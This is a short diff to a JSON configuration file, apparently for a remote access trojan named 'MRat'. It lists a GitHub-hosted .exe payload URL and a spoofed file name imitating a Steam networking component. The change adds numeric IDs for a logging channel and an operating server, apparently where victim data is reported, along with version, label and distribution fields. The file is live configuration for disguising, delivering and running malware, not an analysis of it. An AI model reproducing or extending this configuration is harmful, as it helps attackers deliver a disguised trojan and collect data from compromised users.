@@ -6,7 +6,12 @@
 		  "R3HDWVE5GIZXQZ5E29IQ9T3R1PLSY55K": {
 			  "_MRatDownloadURL": "https://raw.githubusercontent.com/Maploop/DataCenter/main/personal/MX_0000x1.exe",
 			  "_MRatSpoofedName": "SteamNetworkingBit.exe",
-			  "_MRat_TestProfile": true
+			  "_MRat_TestProfile": true,
+			  "_INT_SOFTCODED_OutLogChannel": 1270375550992646207,
+			  "_INT_SOFTCODED_OperatingServer": 873642196916633651,
+			  "_INT_SOFTCODED_ModelVersion": "1.1.3",
+			  "_INT_SOFTCODED_ModelLabel": "Flathead",
+			  "_EXT_SOFTCODED_ModelDistro": "CtrlDeck"
 		  }
 	  }
   }
